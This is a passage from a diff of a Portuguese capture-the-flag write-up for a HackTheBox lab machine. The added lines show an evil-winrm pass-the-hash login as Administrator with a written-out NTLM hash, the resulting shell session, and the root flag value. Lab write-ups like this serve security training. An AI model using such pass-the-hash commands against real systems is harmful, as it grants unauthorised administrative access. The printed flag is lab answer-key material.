@@ -539,5 +539,18 @@ Info: Upload successful!
     Tendo a hash NTLM, podemos usá-la para logar com usuário `Administrator `via PTH no `evil-winrm`. Ao logar, podemos pegar a flag.
 
 ```bash
+evil-winrm -i sequel.htb -u Administrator -H A52F78E4C751E5F5E17E1E9F3E58F4EE
 
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
+02f95def6d3135a46bc74508c083d62d
+*Evil-WinRM* PS C:\Users\Administrator\Desktop>
 ```
